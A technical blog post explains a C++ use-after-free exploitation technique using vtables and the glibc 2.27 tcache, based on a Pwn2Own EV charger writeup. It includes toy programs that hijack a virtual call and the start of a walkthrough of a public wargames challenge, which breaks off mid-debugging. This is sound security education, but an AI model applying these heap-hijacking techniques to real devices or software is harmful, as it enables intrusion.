---
layout: post
title: Analyzing C++ Compiler Vulnerabilities
date: 2025-09-01
---

Ret2 did a [two-part writeup about a pwn2own 2024 challenge](https://blog.ret2.io/2024/07/17/pwn2own-auto-2024-charx-bugs/), where they exploited an electrical vehicle charging station: the CHARX SEC-3100. Both the solution and the [firmware (which is not encrypted)](https://www.phoenixcontact.com/en-us/products/ac-charging-controller-charx-sec-3100-1139012#downloads-link-target) are available online at this time. The firmware is 32-bit ARM and runs in a Linux environment, and the updates are all squashfs'ed, ready to be flashed or unpacked. Their exploit relied on a use-after-free vulnerability, coupled with some interesting side effects from both the code and the standard library version used.

To accompany the Pwn2Own writeups, they also provide a [public challenge](https://wargames.ret2.systems/level/charxpost_destructors), which is part of their wargames platform. To demonstrate the use-after-free vulnerability specifically, they *also* provide some toy code in the first of the two writeups. Both the challenge and the toy code have the same UAF bug, which is triggered by the outer class' destructor on exit.

I wanted to do a deeper dive into the conditions that lead to exploitation in both the toy code example and the Wargames challenge code. The reader is left to solve the Wargames challenge on their own. The intention here is to walk through some C++ and GCC foundations to understand the problems they introduced and how they work together on the path to exploitation.

In particular, the analysis is broken up into a few different parts, most of which were addressed by the two writeups on the EV challenge:

- Understanding the role of [C++ virtual functions](https://en.cppreference.com/w/cpp/language/virtual.html) (and how to spot them)
- Tracing what *free*'d elements look like in [glibc's tcache](https://sourceware.org/glibc/wiki/MallocInternals)
- Seeing how an older glibc standard affects code compilation and execution
- Leveraging the placement of virtual functions in the [vtable](https://en.wikipedia.org/wiki/Virtual_method_table)

Each section contains a quote from the second writeup which explains where my thinking was during exploitation. The intention is to bridge key concepts from the writeup with corresponding behaviors in the Wargames challenge. 

This writeup mostly focuses on how the C++ code compiles. Those understandings are really the key to solving the challenge.  
# Virtual Functions

> Assuming we can control a node along this traversal, we can easily hijack control flow with the virtual call to `get_connection_id`.

Abusing virtual functions to hijack control flow is an interesting side effect of how virtual functions compile.

As a base case, let's consider the following code:

```c++
class Item {
public:
  void foo();
};
```

We will implement every version of `Item::foo` with an innocuous definition:

```c++
void Item::foo() {
  printf("foo\n");
}
```

Then, call it inside `main`:

```c++
int main() {
  Item item;
  item.foo();
}
```

We can compile it with debugging flags for clarity:

```
gcc -g demo.cpp -o demo
```

Then disassemble `main`:

```
(gdb) set print asm-demangle on

(gdb) disas main
Dump of assembler code for function main():
   0x000000000000113a <+0>:     push   rbp
   0x000000000000113b <+1>:     mov    rbp,rsp
   0x000000000000113e <+4>:     sub    rsp,0x10
   0x0000000000001142 <+8>:     lea    rax,[rbp-0x1]
   0x0000000000001146 <+12>:    mov    rdi,rax
   0x0000000000001149 <+15>:    call   0x1156 <Item::foo()>
   0x000000000000114e <+20>:    mov    eax,0x0
   0x0000000000001153 <+25>:    leave
   0x0000000000001154 <+26>:    ret
```

`Item::foo` compiles to its own function. Even if you compile it without the label, the invocation still calls a fixed offset.

Now, let's only modify the `Item` class to make `foo` virtual:

```
class Item {
public:
  virtual void foo();
};
```

We can compile with debugging flags again and disassemble main:

```
(gdb) disas main
Dump of assembler code for function main():
   <+0>:     push   rbp
   <+1>:     mov    rbp,rsp
   <+4>:     sub    rsp,0x10
   <+8>:     lea    rax,[rip+0x2c6f]  # 0x3db8 <vtable for Item+16>
   <+15>:    mov    QWORD PTR [rbp-0x8],rax
   <+19>:    lea    rax,[rbp-0x8]
   <+23>:    mov    rdi,rax
   <+26>:    call   0x1160 <Item::foo()>
   <+31>:    mov    eax,0x0
   <+36>:    leave
   <+37>:    ret
```

Here, too, it compiles to a function at some fixed offset. 

Recall that in `main`, we use an instance of `Item`. Let's refactor it to use a pointer instead:

```
int main() {
  Item *item_ptr = new Item{};
  item_ptr->foo();
}
```

Notice how the invocation changes:

```
Dump of assembler code for function main():
   0x000000000000115a <+0>:     push   rbp
   0x000000000000115b <+1>:     mov    rbp,rsp
   0x000000000000115e <+4>:     push   rbx
   0x000000000000115f <+5>:     sub    rsp,0x18
   0x0000000000001163 <+9>:     mov    edi,0x8
   0x0000000000001168 <+14>:    call   0x1030 <operator new(unsigned long)@plt>
   0x000000000000116d <+19>:    mov    rbx,rax
   0x0000000000001170 <+22>:    mov    QWORD PTR [rbx],0x0
   0x0000000000001177 <+29>:    mov    rdi,rbx
   0x000000000000117a <+32>:    call   0x11d6 <Item::Item()>
   0x000000000000117f <+37>:    mov    eax,0x0
   0x0000000000001184 <+42>:    mov    QWORD PTR [rbp-0x18],rbx
   0x0000000000001188 <+46>:    test   al,al
   0x000000000000118a <+48>:    je     0x1199 <main()+63>
   0x000000000000118c <+50>:    mov    esi,0x8
   0x0000000000001191 <+55>:    mov    rdi,rbx
   0x0000000000001194 <+58>:    call   0x1040 
   0x0000000000001199 <+63>:    mov    rax,QWORD PTR [rbp-0x18]
   0x000000000000119d <+67>:    mov    rax,QWORD PTR [rax]
   0x00000000000011a0 <+70>:    mov    rdx,QWORD PTR [rax]
   0x00000000000011a3 <+73>:    mov    rax,QWORD PTR [rbp-0x18]
   0x00000000000011a7 <+77>:    mov    rdi,rax
   0x00000000000011aa <+80>:    call   rdx
   0x00000000000011ac <+82>:    mov    eax,0x0
   0x00000000000011b1 <+87>:    mov    rbx,QWORD PTR [rbp-0x8]
   0x00000000000011b5 <+91>:    leave
   0x00000000000011b6 <+92>:    ret
```

The actual function call is at `main+80`:

```
(gdb) b *main+80
(gdb) r

Breakpoint 1, in main () 

(gdb) x/i $pc
=> 0x5555555551aa <main()+80>:  call   rdx
(gdb) ni

foo
```

So, the virtual function is set up with this chunk of instructions, and invoked with the call to RDX:

```
   0x0000000000001199 <+63>:    mov    rax,QWORD PTR [rbp-0x18]
   0x000000000000119d <+67>:    mov    rax,QWORD PTR [rax]
   0x00000000000011a0 <+70>:    mov    rdx,QWORD PTR [rax]
   0x00000000000011a3 <+73>:    mov    rax,QWORD PTR [rbp-0x18]
   0x00000000000011a7 <+77>:    mov    rdi,rax
   0x00000000000011aa <+80>:    call   rdx
```

This is conceptually similar to the way function pointers work in standard C. Observe the call to `fptr` is also a call to a register, RDX:

```
$ cat fptr.c
#include <stdio.h>

void do_something() {
  printf("Hello\n");
}

int main() {
  void (*fptr)() = 0;
  fptr = &do_something;
  fptr();
}

$ objdump --disassemble=main -Mintel fptr
...
<main>:
push   rbp
mov    rbp,rsp
sub    rsp,0x10
mov    QWORD PTR [rbp-0x8],0x0
lea    rax,[rip+...]  # <do_something>
mov    QWORD PTR [rbp-0x8],rax
mov    rdx,QWORD PTR [rbp-0x8]
mov    eax,0x0
call   rdx
mov    eax,0x0
leave
ret
```

A major difference, however, is what's happening behind the scenes. Every virtual function defined in a class will compile a "vtable," which is a buffer of memory containing offsets to each virtual function. We can illustrate what the vtable dereference chain by annotating the disassembly:

```
mov    rax, [...]  // *item
mov    rax, [rax]  // item->vtable
mov    rdx, [rax]  // item->vtable->foo
...
call   rdx         // call item->vtable->foo()
```

An interesting property of vtables is that, because it pulls a function at some offset, adding more virtual functions will usually compile at different offsets, and usually in order (although that's not always a guarantee). Let's check this out:

```
class Item {
public:
  virtual void bar();
  virtual void foo();
};
```

You can define `bar` however you want, but we won't be using it. Compile the code and disassemble it again. Note the change to the virtual call instructions:

```
mov    rax,QWORD PTR [rbp-0x18]
mov    rax,QWORD PTR [rax]
add    rax,0x8
mov    rdx,QWORD PTR [rax]
...
call   rdx
```

The `ADD RAX,0x8` instruction queries the vtable a little differently:

```
item->(vtable+0x8)->foo()
```

The address of `Item::foo` exists at offset `0x8` in the Item pointer's vtable.

# Glibc's tcache

> Fully understanding glibc tcache internals isn’t necessary here; it suffices to say that a tcache bin is just a singly-linked list of free chunks of the same size, where the next pointer is placed at offset 0 in the free chunk.

The tcache is a glibc internal mechanism that can be abused in applications using dynamic memory allocation. Over the years, it's served as the object of a few different exploit classes involving dynamic allocation. This walkthrough will show you how to navigate a use-after-free (UAF) bug which involves a tcache entry and a free'd `std::vector`.

The tcache was introduced in glibc 2.26 back in 2017. It still plays a major role in the glibc memory allocator today. There is a [great video on tcache behavior](https://www.youtube.com/watch?v=0jHtqqdVv1Y) and a [good walkthrough on the source code](https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/implementation/tcache/). We'll cover some basics and really focus on how they apply to the `std::vector` type.

Let's start by exploring the tcache entry. In glibc, a `tcache_entry` is both a struct and a typedef of that struct:

```c
typedef
struct tcache_entry
{
  struct tcache_entry *next;
  struct tcache_perthread_struct *key;  // Avoids double-frees.
}
tcache_entry;
```

The `std::vector` type is a C++ linked-list which can store arbitrary data types. Under the hood, it involves some dynamic memory allocations. It is the object of a free Ret2 Wargame challenge and is also the focus of discussion here.

Let's start with some driver code.

```c++
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <vector>

int main() {
  std::vector<uint64_t> v;
  v.push_back(3);
  v.push_back(5);
  v.push_back(9);
  v.push_back(13);

  // Print the contents.
  printf("0x%llu 0x%llu 0x%llu 0x%llu\n", v[0], v[1], v[2], v[3]);

  // Explicitly destroy the vector.
  v.~vector();

  // Intentionally do a use-after free.
  printf("0x%llu 0x%llu 0x%llu 0x%llu\n", v[0], v[1], v[2], v[3]);
}
```

This code prints the following:

```
0x3 0x5 0x9 0x13
0x188703 0x5337669691617803236 0x9 0x13
free(): double free detected in tcache 2
```

The first row is what we, the developer, expected. The second row is the consequence of using the vector after a *free* operation. There's two important dimensions here:

- The elements at `v[0]` and `v[1]` represent data from a tcache entry
- The "double free" error implies that deleting a vector involves some dynamic memory allocation and deallocation

At the crash site, `*next` is a pointer to `0x188703` and the `*key` is `0x5337669691617803236`. Tcache entries exist only after you have *free*'d some allocated memory. In C++, this can include destructors, the `delete` operator, and classic calls to the `free` standard library function.

```
  struct tcache_entry *next: 0x188703
  struct tcache_perthread_struct *key: 0x5337669691617803236
```

Tcache entries are linked lists of *free*'d items of the same "bin" size. Bin sizes are usually powers of two: 8, 16, 32, 64. The logic that defines each bin size is defined in `malloc.c`, and like many things in glibc, its true definition is shrouded in macros. 

Developers can use the output of the `malloc_usable_size` function to help determine which bin an allocation will be *free*'d to. Otherwise, you're left to the debugger, but that's sometimes all you really need.

In this example, the value of `*next` (0x188703) is not an address and will not dereference to anything. This is expected because only one object of that bin's size has been *free*'d. If there were another object of an equivalent size *free*'d before the vector, `*next` would point to it.

So, to facilitate control over the tcache, we need to free something else, something *other than the vector*, but of its same size.

Let's do try that now.

# Finding allocation sizes for tcache bins

> When this node is freed during the list destructor, the chunk will have a size class of `0x68`, and will be placed into the [tcache](https://ir0nstone.gitbook.io/notes/types/heap/the-tcache) bin of that size

Here, we want to consider what size a chunk will be by the time a vector is *free*'d.

If you [read the source code for a vector](https://github.com/gcc-mirror/gcc/blob/master/libstdc%2B%2B-v3/include/bits/stl_vector.h), you'll notice that the vector class template actually extends the `_Vector_base` structure. You'll also notice a `_Vector_impl _M_impl` field, which is the first field defined in this, and has a couple of allocation and deallocation methods near it. This `_M_impl` structure is the backend of the vector type and is a major data structure responsible for many of its dynamic behaviors.

The first field in this structure represents the first item in the vector. In fact, when you view the address of a vector, this structure field is the address you get back.

When the vector's own destructor is called, it calls the destructor of `~Vector_base` last. Here's the pared-down destructor definition for clarity:

```c++
~_Vector_base ()
{
  ptrdiff_t __n = _M_impl._M_end_of_storage - _M_impl._M_start;
  _M_deallocate (_M_impl._M_start, size_t (__n));
}
```

The `_M_deallocate` function has  a call path that leads to `free`. It's easier to appreciate in the debugger. 

We can break at the call to the vector's destructor in *main*, inspect the argument given, and then break on free. If we do one step, we land at the invocation of *free*, where we find that the vector's address is being *free*'d: that is, the `_M_impl` structure, which is allocated at `0x6ee800`.

```
Breakpoint 6, in main

(gdb) x/i $pc
=> <main()+376>: call  std::vector<>::~vector

(gdb) x/gx $rdi
0x7fffffffe150: 0x000055555556b2f0

(gdb) b *free
(gdb) c

Breakpoint 7, __GI___libc_free 

(gdb) bt
#0  __GI___libc_free 
#1  std::__new_allocator<>::deallocate 
#2  std::allocator_traits<>::deallocate 
#3  gned long, std::allocator<>::_M_deallocate 
#4  std::_Vector_base<unsigned long, std::allocator<>::~_Vector_base 
#5  std::vector<unsigned long, std::allocator<>::~vector 
#6  main 

(gdb) print/x $rdi
$8 = 0x55555556b2f0
```

Continue execution. Notice *free* is called only one time. So, the size of the data pointed to by `_M_start` is our culprit for tcache binning.

If we can find the size of the `_M_impl` structure, we can get an idea of what sized allocations will end up in its tcache bin and, thus, link to its `next` pointer. To get this idea for size, we can apply the reverse logic as before and track where the vector operation allocates memory. 

First, let's acknowledge that the internal structure is initialized only after the vector is given some elements. We can observe this by tracking the memory from the vector's creation until the first call to `push_back`:

```

// The vector's internal structure is initialized to null.
(gdb) x/i $pc
=> main+20:  call  std::vector<>::vector
(gdb) x/gx $rdi
0x7fffffffe150: 0x00000000000011ff
(gdb) ni
(gdb) x/gx $rdi
0x7fffffffe150: 0x0000000000000000

(gdb) c
Continuing.

// The structure after the first call to vector::push_back.
Breakpoint 2 in main
(gdb) x/i $pc
=> main+47:  call  std::vector<>::push_back
(gdb) x/gx $rdi
0x7fffffffe150: 0x0000000000000000
(gdb) ni
(gdb) x/gx $rdi
0x7fffffffe0b0: 0x000055555556b2b0
```

We can then set a breakpoint on `malloc` and continue execution to see the call path:

```
Breakpoint 1, main () at demo.cpp:6

(gdb) b *malloc
(gdb) c

Breakpoint 2, __GI___libc_malloc (bytes=8) at ./malloc/malloc.c:3301

(gdb) bt
#0  malloc
#1  operator new
#2  std::__new_allocator<>::allocate
#3  std::allocator_traits<>::allocate
#4  std::_Vector_base<>::_M_allocate
#5  std::vector<>::_M_realloc_append<>
#6  std::vector<>::emplace_back<>
#7  std::vector<>::push_back
#8  main
(gdb) print/x $rdi
$1 = 0x8
```

We can see the call path to `push_back` leads to the allocation. Because `malloc` accepts one argument, a *size_t*, we can see the initial allocation size by printing its argument:

```
(gdb) print/x $rdi
$1 = 0x8
```

Indeed, integers in x64 are four bytes, so this matches our expectations.

Now, recall that each invocation of `push_back` will actually call `malloc`. This has some interesting implications. 

To appreciate this, we will augment the non-pointer vector example to use a function called `malloc_usable_size`, which is the target value we need in order to exploit the main code. I intentionally leave out any initial calls to `push_back` so we can observe the output.

```c++
#include <vector>
#include <stdlib.h>
#include <malloc.h>
#include <stdio.h>


int main() {
    std::vector<int> v;
    auto v_data = v.data();
    auto v_cast = static_cast<void*>(v_data);
    auto v_usable = malloc_usable_size(v_cast);
    printf("Vector backing usable: 0x%lx\n", v_usable);
}
```

This prints:

```
Vector backing usable: 0x0
```

This makes sense because we haven't actually initialized the vector's internal structure with memory. If we add one invocation of `v.push_back(x)`, we get `0x8` (8 bytes). After four invocations, we get `0x40` (64 bytes), and so on. 

Observe some other interesting behaviors:
- If you break on each execution of malloc, and inspect the argument at RDI, you can see the size of the vector's internal data structure increase by 4, 8, 16, and 32, respectively. 
- Likewise, if you run something like `v.erase(v.begin())`, the size of the internal structure will *not* go down or reduce. 
- Finally, the call to `v.~vector` will free the internal structure, whose final size is that of the internal structure after all those calls to `push_back`. 

# Exploiting older tcache implementations

> Set a config value to a string of size `0x60` ... UAF list traversal goes to 2nd fake node (the freed config string)

Strings can be convenient ways to control data. Here, they can play an interesting role in how the tcache works during a use-after-free condition. 

Let's build on the driver code from the tcache discussion and add some string allocations and deallocations:

```c++
#include <inttypes.h>
#include <stdio.h>
#include <vector>
#include <cstring>

const char *NAME = "AAAAAAAA"
                   "AAAAAAAA"
                   "AAAAAAAA"
                   "AAAAAAAA"
                   "AAAAAAAA"
                   "AAAAAAAA"
                   "AAAAAAAA"
                   "AAAAAAA";

int main() {
  std::vector<uint64_t> v;
  char *name = nullptr;

  v.push_back(3);
  v.push_back(5);
  v.push_back(9);
  v.push_back(13);

  name = new char[0x40];
  strncpy(name, (char *)NAME, 0x3f);
  printf("%s\n", name);
  delete name;

  v.~vector();

  printf("%lu\n", v[0]);
}
```

If we compile it with more recent glibc versions, it won't do anything of interest, and we can't control much. So let's take a detour and see which versions are used by the Wargames challenge and the CHARX project. Recall that the CHARX project is available online and not encrypted, and that this specific Wargames challenge is open to the public, so it's fair game to inspect them.

The CHARX executables were likely built with glibc 2.29:

```
strings CharxControllerAgent | grep -i GLIBC_
GLIBC_2.4
GLIBC_2.29
GLIBC_2.8
GLIBC_2.28
GLIBC_2.15
GLIBC_2.17
GLIBC_2.7
```

Likewise, the Wargames platform is likely using glibc 2.27:

```
wdb> vmmap
0x400000-0x409000 r-x charxpost_destructors
...
0x7f0000000000-0x7f0000029000 r-x ld-2.27.so
...
0x7f00007c4000-0x7f00009ab000 r-x libc-2.27.so
...
```

This gives us a range of versions to try out. The obvious way is to build glibc, ldd, and gcc using the specified versions. This would give us a chance to explore the differences in source code and further understand what changes in the memory allocator between old and current versions.

For now, we're going to take a shortcut and just use an old Ubuntu container image, which is up to the spec we need:

```
root@cba6a210200c:/# grep VERSION= /etc/os-release
VERSION="18.04.6 LTS (Bionic Beaver)"

root@cba6a210200c:/# ldd --version
ldd (Ubuntu GLIBC 2.27-3ubuntu1.6) 2.27
```

We can substitute the CLI `gcc` with a container that does the same thing but for a different version:

```
$ cat Dockerfile
FROM ubuntu:18.04

RUN apt update && \
    apt install -y --no-install-recommends g++

ENTRYPOINT ["g++"]

$ docker build -t ret2gpp .
```

Then build the application, passing the G++ options to the container options:

```
docker run -v "$(pwd)":/code --rm ret2gpp \
	-g -static /code/demo.cpp -o /code/demo
```

*Note: The use of `static` here is essential. Because any modern host system likely uses a different version of libc, you probably won't observe the same behavior as you would when it's executed on a system with that version of libc installed. By compiling as static, we provide a portable way to preserve those behaviors across different x64 systems.*

Let's open in GDB and break on the instruction just after the vector's `[]` operator:

```
(gdb) disas main
...
   0x0000000000400cf9 <+268>:   call   0x400e10 <vector::operator[]>
   0x0000000000400cfe <+273>:   mov    rax,QWORD PTR [rax]
...

(gdb) b *main+273
Breakpoint 1 at 0x400cfe: file /code/ver.cpp, line 32.
(gdb) r
...
Breakpoint 1, 0x0000000000400cfe in main () at /code/ver.cpp:32
32        printf("%lu\n", v[0]);

(gdb) x/i $pc
=> 0x400cfe <main()+273>:       mov    rax,QWORD PTR [rax]

(gdb) x/4gx $rax
0x6ee7a0:       0x00000000006ee7f0    0x00000000006dc1d0
0x6ee7b0:       0x0000000000000009    0x000000000000000d
```

Because we allocated and free'd some strings of the same usable size as the vector's internal structure, the value of `tcache_entry->next` at RAX (`0x6ee7a0`) should point to one of those free'd entries:

```
(gdb) x/4gx 0x00000000006ee7f0
0x6ee7f0:       0x0000000000000000    0x00000000006dc1d0
0x6ee800:       0x4141414141414141    0x4141414141414141
```

The hex-encoded "A"s mean we were correct. This is the final tcache entry in this bin. 

The important aspect here is that you have a way to control a buffer's allocation size so you can match it against the target (here, the vector's internal structure size). You can use previously discussed techniques to find it and adjust the string allocation. For example, the following patch to the code used in this section would work for a one-item vector.

```c++
  ...
  std::vector<uint64_t> v;
  v.push_back(3);
  //printf("%lu\n", malloc_usable_size(static_cast<void*>(v.data())));  // 24
  name = new char[24];
  strncpy(name, (CHAR *)name, 23);
  ...
```

You'll notice the first sixteen "A"s were wiped out by the `tcache_entry` data, leaving only the final eight:

```
(gdb) x/4gx $rax
0x6f2730:       0x00000000006f2750    0x00000000006e01d0
0x6f2740:       0x0000000000000000    0x0000000000000021

(gdb) x/4gx 0x00000000006f2750
0x6f2750:       0x0000000000000000    0x00000000006e01d0
0x6f2760:       0x4141414141414141    0x0000000000000411
```

It should be obvious from the disassembly, but at this time, the strings provide no real advantage for exploitation. This is due entirely to the fact that we're just pulling a long unsigned int and printing its value (ie, the tcache entry).

```
   0x0000000000400cba <+205>:   mov    rax,QWORD PTR [rax]
   0x0000000000400cbd <+208>:   mov    rsi,rax
   ...
   0x0000000000400ccc <+223>:   call   0x428ff0 <printf>
```

If we could trick the compiler into reading data from the `tcache_entry->next+16`, we might gain some advantage for exploitation: either through a read or an execution.

# The benefits of vtables

> Our primitive has evolved from a simple UAF into an arbitrary virtual call

So far, we've considered two different types of code: that which uses virtual functions, and code that uses vulnerable tcache versions. Let's combine the two concepts:

```c++
class Item {
public:
  virtual void do_something();
};

...

int main() {
  std::vector<Item *> v;
  char *name = nullptr;

  v.push_back(new Item{});
  v[0]->do_something();

  name = new char[24];
  strncpy(name, (char *)NAME, 23);
  printf("%s\n", name);
  delete name;

  v.~vector();

  v[0]->do_something();
}
```

It will crash just before the virtual call to `do_something`:

```
(gdb) x/i $pc
=> 0x400cf5 <main()+231>:       mov    rdx,QWORD PTR [rdx]

(gdb) x/gx $rax
0x6f2b80:       0x0000000000000000

(gdb) disas main
   0x0000000000400cea <+220>:   call   0x400e2e <vector::operator[]>
   0x0000000000400cef <+225>:   mov    rax,QWORD PTR [rax]
   0x0000000000400cf2 <+228>:   mov    rdx,QWORD PTR [rax]
=> 0x0000000000400cf5 <+231>:   mov    rdx,QWORD PTR [rdx]
   ...
   0x0000000000400cfb <+237>:   call   rdx
```

This is no surprise given the data we looked at earlier. Zero is the value at `0x6f2750`:

```
(gdb) x/4gx $rax
0x6f2730:       0x00000000006f2750    0x00000000006e01d0
0x6f2740:       0x0000000000000000    0x0000000000000021

(gdb) x/4gx 0x00000000006f2750
0x6f2750:       0x0000000000000000    0x00000000006e01d0
0x6f2760:       0x4141414141414141    0x0000000000000411
```

We can vizualize it like:

```
rax, [rax]  // *item
rdx, [rax]  // item->vtable
rdx, [rdx]  // item->vtable->do_something <fails to dereference 0x0
```

So, it fails when trying to dereference `do_something`. This is completely understandable because we are, again, exploiting a use-after-free condition. The "vtable" is really pointing to the `tcache->next` pointer, which contains the sixteen bytes needed for a tcache entry followed by any extra data.

Recall that tcache entries are all singly linked lists, whose first value will always point to another item of the same bin size. To (*sort of*) complete the vtable dereference, we can allocate and remove another string buffer whose size will also land in the same bin.

To keep it simple, let's use an array of two names and perform the same allocation and deallocation operations on each element:

```c++
  char *names[2];
  ...
  
  for (int i = 0; i < 2; i++) {
    names[i] = new char[24];
    strncpy(names[i], (char *)NAME, 23);
    printf("%s\n", names[i]);
  }

  for (int i = 0; i < 2; i++) {
    delete names[i];
  }
  ...
```

The extra *free*'d string buffer gives us one more node to traverse in the tcache list:

```
(gdb) x/5i $pc
=> 0x400d28 <main()+282>:       mov    rax,QWORD PTR [rax]
   0x400d2b <main()+285>:       mov    rdx,QWORD PTR [rax]
   0x400d2e <main()+288>:       mov    rdx,QWORD PTR [rdx]
   0x400d31 <main()+291>:       mov    rdi,rax
   0x400d34 <main()+294>:       call   rdx
   
(gdb) x/4gx $rax
0x6f2750:       0x00000000006f2ba0    0x00000000006e01d0
0x6f2760:       0x0000000000000000    0x0000000000000411

(gdb) x/4gx 0x00000000006f2ba0
0x6f2ba0:       0x00000000006f2b80    0x00000000006e01d0
0x6f2bb0:       0x0041414141414141    0x000000000000f451

(gdb) x/4gx 0x00000000006f2b80
0x6f2b80:       0x0000000000000000    0x00000000006e01d0
0x6f2b90:       0x0041414141414141    0x0000000000000021
```

This completes the dereference path, but points it to data that we almost control. Here, it will make it to CALL RDX, but RDX will be zero, the value of 0x6f2b80.

```
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()

(gdb) bt
#0  0x0000000000000000 in ?? ()
#1  0x0000000000400d36 in main ()
```

Recall from the earlier section on virtual functions that the vtable may adjust the target quadword that is dereferenced. If we add more virtual functions, we should be able to gain some control over execution.

Right now, the vtable looks like this, because it has one virtual function:

```
offset  target function
------  ----------------
 0x0     do_something
```

Let's redefine `Item` to include one new virtual function:

```c++
class Item {
public:
  virtual void foo();
  virtual void do_something();
};
```

This should adjust the vtable to look like this:

```
offset  target function
------  ----------------
 0x0     foo
 0x8     do_something
```

Implement `Item::foo` however you want. Then, compile it, and observe that an offset of 0x8 is added to the virtual call instructions:

```
   0x0000000000400d2c <+286>:   mov    rax,QWORD PTR [rax]
   0x0000000000400d2f <+289>:   mov    rdx,QWORD PTR [rax]
   0x0000000000400d32 <+292>:   add    rdx,0x8
   0x0000000000400d36 <+296>:   mov    rdx,QWORD PTR [rdx]
   ...
   0x0000000000400d3c <+302>:   call   rdx
```

Let it run and let it crash:

```
Program received signal SIGSEGV, Segmentation fault.
0x00000000006e01d0 in ?? ()
```

Now, instead of failing at `tcache_entry->next`, it fails at a fake `tcache_entry->key`:

```
(gdb) x/4gx 0x00000000006f2b80
0x6f2b80:       0x0000000000000000    0x00000000006e01d0
0x6f2b90:       0x0041414141414141    0x0000000000000021
```

So, this matches what we expected to happen.

Now, let's add a final trivial virtual function, `bar`, to complete the vtable and gain some control over the execution:

```
offset  target function
------  ----------------
 0x0     foo
 0x8     bar
0x10     do_something
```

CALL RDX now points to whatever we inserted in the buffer earlier:

```
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400d3c in main ()
42        v[0]->do_something();

(gdb) x/i $pc
=> 0x400d3c <main()+302>:       call   rdx

(gdb) print/x $rdx
$1 = 0x41414141414141
```

If the data we added to the string buffers was something more useful, like the address of an unreachable function, that function would execute here.

# Wargames Writeup

Let's jump into [the challenge](https://wargames.ret2.systems/level/charxpost_destructors#).

Use static analysis to make the following observations:
- The `Charger` class nests a `ChargePortManager`, which invokes a callback function `on_port_disconnected`. This is nearly identical to the dangerous behaviors described in the blog posts.
- The `Charger` instance is declared in global scope. This will have a similar behavior to the writeups' explanation of using `static` versions in the `main` scope. Its destructor will be called in a scope that precedes `main`, so any weird behaviors won't be obvious in static analysis.
- There is an opportunity to create strings of an arbitrary buffer. These are the "names" of the two charge plug types. We can try to control data when these values are created (with `new`) and to send them to the tcache when they are free'd (with `delete`).
- Although there's no clear confirmation here, we can see references to `libc 2.27` in output from `vmmap` and `info proc mappings`, so it's reasonable to wonder if it's using an older tcache version.

Start the program and don't do anything (select option 6). Notice it exits gracefully.

```
Choice: 
>> 6
==== EXECUTION FINISHED ====
```

Rerun the program and create *one* charge connector with option 1. You can choose either of the two connector types. For now, don't give it a name.

```
Choice: 
>> 1
Type of charging gun?
1. Standard
2. High Ampacity
Choice: 
>> 1
Enter length of description (0 for no description): 
>> 
Charge gun added!
```

After the charger is created, exit the program. Notice it crashes hideously:

```
Choice: 
>> 6
Segmentation Fault
rax: 0x0000000000000000
rbx: 0x0000000000000000
rcx: 0x0000000000000000
rdx: 0x00007fffffffeca0
rsi: 0x00007fffffffeca0
rdi: 0x00007fffffffec98
rbp: 0x00007fffffffecc0
rsp: 0x00007fffffffec80
rip: 0x000000000040205e
r8:  0x00007fffffffed93
r9:  0x0000000000000000
r10: 0x0000000000000006
r11: 0x00007f000085ba30
r12: 0x00007f0000baf718
r13: 0x0000000000000007
r14: 0x00007f0000bb4708
r15: 0x00007f0000bb0d80
fs:  0x0000000000000000
gs:  0x0000000000000000
eflags: 0x0000000000000000
```

Let's inspect where the crash occurred:

```
wdb> backtrace
0x40205e in Charger::on_port_disconnected ()
0x401f23 in ChargePortManager::disconnect_port ()
0x401d91 in ChargePortManager::~ChargePortManager ()
0x40591e in Charger::~Charger ()
0x7f0000807161 in  ()

wdb> x/i $pc
0x40205e <Charger::on_port_disconnected+120>:  mov rax, qword ptr [rax]
```

Check out its source code:

```c++
        void on_port_disconnected(int p) {
            for (ChargeGun* gun : guns)
                if (gun->uses_port(p)) {
                    gun->plugged_in = false;
                    break;
                }
        }
```

Now, zoom out of the disassembly, around the area of the crash:

```
0x40204e <+104>:  call    0x402696 <__normal_iterator<ChargeGun**, std::vector<ChargeGun*> >::operator*>
0x402053 <+109>:  mov     rax, qword [rax]
0x402056 <+112>:  mov     qword [rbp-0x10], rax
0x40205a <+116>:  mov     rax, qword [rbp-0x10]
0x40205e <+120>:  mov     rax, qword [rax]
0x402061 <+123>:  add     rax, 0x10
0x402065 <+127>:  mov     rax, qword [rax]
0x402068 <+130>:  mov     ecx, dword [rbp-0x3c]
0x40206b <+133>:  mov     rdx, qword [rbp-0x10]
0x40206f <+137>:  mov     esi, ecx
0x402071 <+139>:  mov     rdi, rdx
0x402074 <+142>:  call    rax
```

The `CALL RAX` command should stand out as the virtual call to `on_port_disconnected`. We can backtrack some of the other steps to make sense of the behavior:

```
<+104>:  call    0x402696 <__normal_iterator<ChargeGun**, std::vector<ChargeGun*> >::operator*>
<+109>:  mov     rax, qword [rax]      ;
<+112>:  mov     qword [rbp-0x10], rax ; 
<+116>:  mov     rax, qword [rbp-0x10] ; Address of charger
<+120>:  mov     rax, qword [rax]      ; charger->vtable
<+123>:  add     rax, 0x10             ; charger->vtable[0x10]
<+127>:  mov     rax, qword [rax]      ; charger->vtable[0x10]->uses_port
<+130>:  mov     ecx, dword [rbp-0x3c] ; 
<+133>:  mov     rdx, qword [rbp-0x10] ; 
<+137>:  mov     esi, ecx              ; Value of p
<+139>:  mov     rdi, rdx              ; Address of charger
<+142>:  call    rax                   ; call ChargeGunBase::uses_port()
```

We can see it's failing to fetch the address of the charger, a side effect of the UAF condition. You can break here, restart the application, and remove a connector (option 2) to see the expected behavior and trace to the address of `on_port_disconnected`. 

```
Breakpoint 1: 0x40205e, Charger::on_port_disconnected+120

wdb> x/8i $pc
0x40205e <Charger::on_port_disconnected+120>:  mov rax, qword ptr [rax]
0x402061 <Charger::on_port_disconnected+123>:  add rax, 0x10
0x402065 <Charger::on_port_disconnected+127>:  mov rax, qword ptr [rax]
0x402068 <Charger::on_port_disconnected+130>:  mov ecx, dword ptr [rbp - 0x3c]
0x40206b <Charger::on_port_disconnected+133>:  mov rdx, qword ptr [rbp - 0x10]
0x40206f <Charger::on_port_disconnected+137>:  mov esi, ecx
0x402071 <Charger::on_port_disconnected+139>:  mov rdi, rdx
0x402074 <Charger::on_port_disconnected+142>:  call rax

wdb> print $rax
$3 = 0x61cea0

wdb> x/x $rax
0x61cea0: 0x00608d20

wdb> x/x 0x00608d20+0x10
